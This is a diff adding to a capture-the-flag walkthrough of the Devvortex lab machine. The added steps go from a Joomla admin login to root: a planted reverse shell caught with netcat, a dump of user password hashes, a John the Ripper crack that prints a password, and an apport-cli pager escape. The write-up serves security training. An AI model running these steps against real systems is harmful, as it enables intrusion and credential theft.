@@ -429,7 +429,7 @@ end
 
 ```
 
-Again, I can see the path that we curled before...and there is another path to curl to within the poc:
+Again, I can see the path that we curl before...and there is another path to curl to within the poc:
 ```
 def fetch_config(root_url, http)
   vuln_url = "#{root_url}/api/index.php/v1/config/application?public=true"
@@ -476,7 +476,340 @@ lewis:P4ntherg0t1n5r3c0n##
 let's take these credentials and try to connect into the joomla administrator login.
 and we are in.
 
-upload reverse shell
+upload reverse shell to one of the pages that are exist.
+
+
+![image](https://cdn-images-1.medium.com/max/1000/1*tQIKnoKkjCSMJfik_PmGxg.png)
+
+set netcat listener on your machine:
+
+
+```bash
+nc -lnvp 1234
+```
+
+after saving the file there is a shell.
+
+```bash
+└─# nc -lnvp 1234
+listening on [any] 1234 ...
+connect to [tun-0] from (UNKNOWN) [10.10.11.242] 41860
+bash: cannot set terminal process group (856): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@devvortex:~/dev.devvortex.htb$ whoami
+whoami
+www-data
+www-data@devvortex:~/dev.devvortex.htb$
+```
+
+I tried to achieve the first flag but it's location is /home/logan and as www-data we don't have any permission.
+
+so I decided to upload linpeas from my machine to the target-ip to find a way to become logan.
+
+There is mysql service that runs within the system on port 3306.
+
+as we know that lets try to get inside the db with the credentials of lewis that we got before from the db leaked information.
+
+before that you have the stabalize the shell with:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+It's important cause than you won't be able to access the database.
+
+after you got an entry you want to get all databases names with:
+
+```
+mysql> SHOW DATABASES;
+SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| joomla             |
+| performance_schema |
++--------------------+
+3 rows in set (0.00 sec)
+```
+
+There is database that is name is 'joomla':
+
+```
+mysql> USE joomla
+USE joomla
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+```
+
+we are inside 'joomla' db.
+
+The next step is to get all the tables within this db:
+
+```
+mysql> SHOW TABLES;
+SHOW TABLES;
++-------------------------------+
+| Tables_in_joomla              |
++-------------------------------+
+| sd4fg_action_log_config       |
+| sd4fg_action_logs             |
+| sd4fg_action_logs_extensions  |
+| sd4fg_action_logs_users       |
+| sd4fg_assets                  |
+| sd4fg_associations            |
+| sd4fg_banner_clients          |
+| sd4fg_banner_tracks           |
+| sd4fg_banners                 |
+| sd4fg_categories              |
+| sd4fg_contact_details         |
+| sd4fg_content                 |
+| sd4fg_content_frontpage       |
+| sd4fg_content_rating          |
+| sd4fg_content_types           |
+| sd4fg_contentitem_tag_map     |
+| sd4fg_extensions              |
+| sd4fg_fields                  |
+| sd4fg_fields_categories       |
+| sd4fg_fields_groups           |
+| sd4fg_fields_values           |
+| sd4fg_finder_filters          |
+| sd4fg_finder_links            |
+| sd4fg_finder_links_terms      |
+| sd4fg_finder_logging          |
+| sd4fg_finder_taxonomy         |
+| sd4fg_finder_taxonomy_map     |
+| sd4fg_finder_terms            |
+| sd4fg_finder_terms_common     |
+| sd4fg_finder_tokens           |
+| sd4fg_finder_tokens_aggregate |
+| sd4fg_finder_types            |
+| sd4fg_history                 |
+| sd4fg_languages               |
+| sd4fg_mail_templates          |
+| sd4fg_menu                    |
+| sd4fg_menu_types              |
+| sd4fg_messages                |
+| sd4fg_messages_cfg            |
+| sd4fg_modules                 |
+| sd4fg_modules_menu            |
+| sd4fg_newsfeeds               |
+| sd4fg_overrider               |
+| sd4fg_postinstall_messages    |
+| sd4fg_privacy_consents        |
+| sd4fg_privacy_requests        |
+| sd4fg_redirect_links          |
+| sd4fg_scheduler_tasks         |
+| sd4fg_schemas                 |
+| sd4fg_session                 |
+| sd4fg_tags                    |
+| sd4fg_template_overrides      |
+| sd4fg_template_styles         |
+| sd4fg_ucm_base                |
+| sd4fg_ucm_content             |
+| sd4fg_update_sites            |
+| sd4fg_update_sites_extensions |
+| sd4fg_updates                 |
+| sd4fg_user_keys               |
+| sd4fg_user_mfa                |
+| sd4fg_user_notes              |
+| sd4fg_user_profiles           |
+| sd4fg_user_usergroup_map      |
+| sd4fg_usergroups              |
+| sd4fg_users                   |
+| sd4fg_viewlevels              |
+| sd4fg_webauthn_credentials    |
+| sd4fg_workflow_associations   |
+| sd4fg_workflow_stages         |
+| sd4fg_workflow_transitions    |
+| sd4fg_workflows               |
++-------------------------------+
+71 rows in set (0.00 sec)
+```
+
+There is a table that maybe has credentials: sd4fg_users.
+
+lets watch the tables with:
+
+```
+mysql> select * from sd4fg_users;
+select * from sd4fg_users;
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-04-03 22:06:04 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
+| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL          |          0 |        |      |            0 |              |
++-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
+2 rows in set (0.00 sec)
+
+```
+
+And there are credentials to logan and lewis. we need logan's hashed password.
+
+create a file with the hash and crack it with john the ripper:
+
+```bash
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+tequieromucho    (?)     
+1g 0:00:00:14 DONE (2024-04-03 18:21) 0.07057g/s 99.08p/s 99.08c/s 99.08C/s iceman..harry
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+we got the password.
+
+```bash
+www-data@devvortex:~/dev.devvortex.htb$ su logan                                                                                       
+su logan                                                                                                                               
+Password: tequieromucho                                                                                                                
+                                                                                                                                       
+logan@devvortex:/var/www/dev.devvortex.htb$
+```
+
+and we are logan.
+
+grab the user.txt flag.
+
+logan@devvortex:/var/www/dev.devvortex.htb$ cat /home/logan/user.txt                                                                   
+cat /home/logan/user.txt                                                                                                               
+********************************                                                                                                       
+logan@devvortex:/var/www/dev.devvortex.htb$ 
+
+Let's try to escalate our privilliges with:
+
+```bash
+sudo -l
+```
+
+It checks which files logan can run with elevated permissions with sudo.
+
+```bash
+logan@devvortex:/var/www/dev.devvortex.htb$ sudo -l                                                                                    
+sudo -l                                                                                                                                
+[sudo] password for logan: **************                                                                                               
+                                                                                                                                       
+Matching Defaults entries for logan on devvortex:                                                                                      
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User logan may run the following commands on devvortex:
+    (ALL : ALL) /usr/bin/apport-cli
+
+```
+
+I cat the binary file but didn't understand what it actually does so I searched about that file on google.
+
+I found an exploit on : https://vk9-sec.com/cve-2023-1326privilege-escalation-apport-cli-2-26-0/
+
+use it, but the most important thing is to understand what are you doing (read about the vulnerablity).
+
+Grab root.txt flag.
+
+
+```bash
+logan@devvortex:/var/www/dev.devvortex.htb$ sudo /usr/bin/apport-cli --file-bug
+<.devvortex.htb$ sudo /usr/bin/apport-cli --file-bug
+
+*** What kind of problem do you want to report?
+
+
+Choices:
+  1: Display (X.org)
+  2: External or internal storage devices (e. g. USB sticks)
+  3: Security related problems
+  4: Sound/audio related problems
+  5: dist-upgrade
+  6: installation
+  7: installer
+  8: release-upgrade
+  9: ubuntu-release-upgrader
+  10: Other problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/7/8/9/10/C): 2
+2^J
+
+*** Collecting problem information
+
+The collected information can be sent to the developers to improve the
+application. This might take a few minutes.
+
+*** What particular problem do you observe?
+
+
+Choices:
+  1: Removable storage device is not mounted automatically
+  2: Internal hard disk partition cannot be mounted manually
+  3: Internal hard disk partition is not displayed in Places menu
+  4: No permission to access files on storage device
+  5: Documents cannot be opened in desktop UI on storage device
+  6: Other problem
+  C: Cancel
+Please choose (1/2/3/4/5/6/C): 4
+4^J
+..................................
+
+*** Send problem report to the developers?
+
+After the problem report has been sent, please fill out the form in the
+automatically opened web browser.
+
+What would you like to do? Your options are:
+  S: Send report (712.4 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): 
+What would you like to do? Your options are:
+  S: Send report (712.4 KB)
+  V: View report
+  K: Keep report file for sending later or copying to somewhere else
+  I: Cancel and ignore future crashes of this program version
+  C: Cancel
+Please choose (S/V/K/I/C): V
+V^J
+WARNING: terminal is not fully functional
+-  (press RETURN)!/bin/bash 
+!//bbiinn//bbaasshh!/bin/bash
+root@devvortex:/var/www/dev.devvortex.htb# whoami
+whoami
+root
+root@devvortex:/var/www/dev.devvortex.htb# cat /root/root.txt
+cat /root/root.txt
+*******************************
+```
+
+THIS IS THE END!
+
+***Written by Alon Presman, Penetration Tester and Ethical Hacker.***
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
